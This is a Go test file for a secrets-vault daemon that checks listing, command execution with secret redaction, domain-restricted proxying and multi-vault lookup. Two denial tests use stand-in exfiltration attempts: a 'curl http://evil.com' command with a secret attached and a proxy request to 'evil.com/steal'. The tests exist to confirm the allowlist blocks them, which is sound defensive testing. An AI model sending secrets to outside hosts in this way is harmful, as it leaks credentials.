package daemon

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/djtouchette/vaulty/internal/policy"
	"github.com/djtouchette/vaulty/internal/vault"
)

func echoEnvCmd(varName string) string {
	if runtime.GOOS == "windows" {
		return "echo %" + varName + "%"
	}
	return "echo $" + varName
}

func setupTestDaemon(t *testing.T) *Daemon {
	t.Helper()

	dir := t.TempDir()
	vaultPath := filepath.Join(dir, "test.age")
	pass := "testpass"

	vault.Create(vaultPath, pass)
	v, _ := vault.Open(vaultPath, pass)
	v.Set("API_KEY", "sk_test_secret123")
	v.Set("DB_URL", "postgres://user:pass@localhost/db")

	cfg := &policy.Config{
		Vault: policy.VaultConfig{
			Path:        vaultPath,
			IdleTimeout: "1h",
			Socket:      filepath.Join(dir, "vaulty.sock"),
			HTTPPort:    0,
		},
		Secrets: map[string]policy.SecretPolicy{
			"API_KEY": {
				AllowedDomains: []string{"api.example.com"},
				InjectAs:       "bearer",
			},
			"DB_URL": {
				AllowedCommands: []string{"echo", "psql"},
				InjectAs:        "env",
			},
		},
	}

	vaults := map[string]*vault.Vault{"": v}
	d, err := New(vaults, cfg)
	if err != nil {
		t.Fatalf("New daemon: %v", err)
	}
	d.pidPath = filepath.Join(dir, "vaulty.pid")
	t.Cleanup(func() { d.cleanup() })

	return d
}

func TestDaemonHandleList(t *testing.T) {
	d := setupTestDaemon(t)
	resp := d.handleList()

	if !resp.OK {
		t.Fatalf("expected OK, got error: %s", resp.Error)
	}
	if len(resp.SecretList) != 2 {
		t.Errorf("expected 2 secrets, got %d", len(resp.SecretList))
	}

	found := make(map[string]bool)
	for _, s := range resp.SecretList {
		found[s.Name] = true
	}
	if !found["API_KEY"] || !found["DB_URL"] {
		t.Errorf("missing expected secrets: %v", resp.SecretList)
	}
}

func TestDaemonHandleExec(t *testing.T) {
	d := setupTestDaemon(t)

	resp := d.handleExec(Request{
		Command: echoEnvCmd("DB_URL"),
		Secrets: []string{"DB_URL"},
	})

	if !resp.OK {
		t.Fatalf("expected OK, got error: %s", resp.Error)
	}

	if strings.Contains(resp.Stdout, "postgres://") {
		t.Error("stdout should not contain raw secret")
	}
	if !strings.Contains(resp.Stdout, "[VAULTY:DB_URL]") {
		t.Errorf("stdout should contain redacted placeholder, got %q", resp.Stdout)
	}
}

func TestDaemonHandleExecDenied(t *testing.T) {
	d := setupTestDaemon(t)

	resp := d.handleExec(Request{
		Command: "curl http://evil.com",
		Secrets: []string{"DB_URL"},
	})

	if resp.OK {
		t.Error("expected denial")
	}
	if !strings.Contains(resp.Error, "not in allowlist") {
		t.Errorf("error should mention allowlist, got %q", resp.Error)
	}
}

func TestDaemonHandleProxyDenied(t *testing.T) {
	d := setupTestDaemon(t)

	resp := d.handleProxy(Request{
		Method: "GET",
		URL:    "https://evil.com/steal",
		Secret: "API_KEY",
	})

	if resp.OK {
		t.Error("expected denial for wrong domain")
	}
	if !strings.Contains(resp.Error, "not in allowlist") {
		t.Errorf("error = %q", resp.Error)
	}
}

func TestDaemonHandleProxy(t *testing.T) {
	// Set up a test HTTP server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		if auth != "Bearer sk_test_secret123" {
			t.Errorf("auth = %q", auth)
		}
		w.WriteHeader(200)
		w.Write([]byte(`{"status":"ok"}`))
	}))
	defer server.Close()

	d := setupTestDaemon(t)
	// Override policy to allow test server domain
	d.config.Secrets["API_KEY"] = policy.SecretPolicy{
		AllowedDomains: []string{"127.0.0.1"},
		InjectAs:       "bearer",
	}

	resp := d.handleProxy(Request{
		Method: "GET",
		URL:    server.URL + "/v1/test",
		Secret: "API_KEY",
	})

	if !resp.OK {
		t.Fatalf("expected OK, got error: %s", resp.Error)
	}
	if resp.Status != 200 {
		t.Errorf("status = %d, want 200", resp.Status)
	}
}

func TestDaemonHTTPEndpoint(t *testing.T) {
	d := setupTestDaemon(t)

	mux := http.NewServeMux()
	mux.HandleFunc("/v1/request", d.handleRequest)

	ts := httptest.NewServer(mux)
	defer ts.Close()

	// Test list via HTTP
	reqBody, _ := json.Marshal(Request{Action: "list"})
	resp, err := http.Post(ts.URL+"/v1/request", "application/json", strings.NewReader(string(reqBody)))
	if err != nil {
		t.Fatalf("POST: %v", err)
	}
	defer resp.Body.Close()

	var daemonResp Response
	json.NewDecoder(resp.Body).Decode(&daemonResp)

	if !daemonResp.OK {
		t.Errorf("expected OK, got error: %s", daemonResp.Error)
	}
	if len(daemonResp.SecretList) != 2 {
		t.Errorf("expected 2 secrets, got %d", len(daemonResp.SecretList))
	}
}

func setupMultiVaultDaemon(t *testing.T) *Daemon {
	t.Helper()

	dir := t.TempDir()
	pass := "testpass"

	// Create default vault
	defaultPath := filepath.Join(dir, "vault.age")
	vault.Create(defaultPath, pass)
	defaultVault, _ := vault.Open(defaultPath, pass)
	defaultVault.Set("DEFAULT_KEY", "default-secret")

	// Create staging vault
	stagingPath := filepath.Join(dir, "vaults", "staging.age")
	vault.Create(stagingPath, pass)
	stagingVault, _ := vault.Open(stagingPath, pass)
	stagingVault.Set("STAGING_KEY", "staging-secret")

	cfg := &policy.Config{
		Vault: policy.VaultConfig{
			Path:        defaultPath,
			IdleTimeout: "1h",
			Socket:      filepath.Join(dir, "vaulty.sock"),
			HTTPPort:    0,
		},
		Secrets: map[string]policy.SecretPolicy{
			"DEFAULT_KEY": {
				AllowedDomains: []string{"api.example.com"},
				InjectAs:       "bearer",
			},
			"STAGING_KEY": {
				AllowedDomains: []string{"staging.example.com"},
				InjectAs:       "bearer",
				Vault:          "staging",
			},
		},
	}

	vaults := map[string]*vault.Vault{
		"":        defaultVault,
		"staging": stagingVault,
	}

	d, err := New(vaults, cfg)
	if err != nil {
		t.Fatalf("New multi-vault daemon: %v", err)
	}
	d.pidPath = filepath.Join(dir, "vaulty.pid")
	t.Cleanup(func() { d.cleanup() })

	return d
}

func TestMultiVaultHandleList(t *testing.T) {
	d := setupMultiVaultDaemon(t)
	resp := d.handleList()

	if !resp.OK {
		t.Fatalf("expected OK, got error: %s", resp.Error)
	}
	if len(resp.SecretList) != 2 {
		t.Errorf("expected 2 secrets across vaults, got %d", len(resp.SecretList))
	}

	found := make(map[string]string) // name -> vault
	for _, s := range resp.SecretList {
		found[s.Name] = s.Vault
	}
	if _, ok := found["DEFAULT_KEY"]; !ok {
		t.Error("missing DEFAULT_KEY in list")
	}
	if found["DEFAULT_KEY"] != "" {
		t.Errorf("DEFAULT_KEY vault = %q, want empty (default)", found["DEFAULT_KEY"])
	}
	if found["STAGING_KEY"] != "staging" {
		t.Errorf("STAGING_KEY vault = %q, want staging", found["STAGING_KEY"])
	}
}

func TestMultiVaultHandleExec(t *testing.T) {
	d := setupMultiVaultDaemon(t)

	// Request a secret from the staging vault via policy vault field
	d.config.Secrets["STAGING_KEY"] = policy.SecretPolicy{
		AllowedCommands: []string{"echo"},
		InjectAs:        "env",
		Vault:           "staging",
	}

	resp := d.handleExec(Request{
		Command: echoEnvCmd("STAGING_KEY"),
		Secrets: []string{"STAGING_KEY"},
	})

	if !resp.OK {
		t.Fatalf("expected OK, got error: %s", resp.Error)
	}
	if !strings.Contains(resp.Stdout, "[VAULTY:STAGING_KEY]") {
		t.Errorf("stdout should contain redacted placeholder, got %q", resp.Stdout)
	}
}

func TestMultiVaultHandleExecExplicitVault(t *testing.T) {
	d := setupMultiVaultDaemon(t)

	// Use explicit vault in request (overrides policy)
	d.config.Secrets["STAGING_KEY"] = policy.SecretPolicy{
		AllowedCommands: []string{"echo"},
		InjectAs:        "env",
	}

	resp := d.handleExec(Request{
		Command: echoEnvCmd("STAGING_KEY"),
		Secrets: []string{"STAGING_KEY"},
		Vault:   "staging",
	})

	if !resp.OK {
		t.Fatalf("expected OK, got error: %s", resp.Error)
	}
}

func TestMultiVaultNotLoaded(t *testing.T) {
	d := setupMultiVaultDaemon(t)

	d.config.Secrets["MISSING_KEY"] = policy.SecretPolicy{
		AllowedCommands: []string{"echo"},
		InjectAs:        "env",
	}

	// Request a vault that doesn't exist
	resp := d.handleExec(Request{
		Command: echoEnvCmd("MISSING_KEY"),
		Secrets: []string{"MISSING_KEY"},
		Vault:   "production",
	})

	if resp.OK {
		t.Error("expected error for missing vault")
	}
	if !strings.Contains(resp.Error, "not loaded") {
		t.Errorf("error should mention vault not loaded, got %q", resp.Error)
	}
}

func TestDaemonRunAndStop(t *testing.T) {
	d := setupTestDaemon(t)

	ctx, cancel := context.WithTimeout(context.Background(), 500*time.Millisecond)
	defer cancel()

	err := d.Run(ctx)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
}
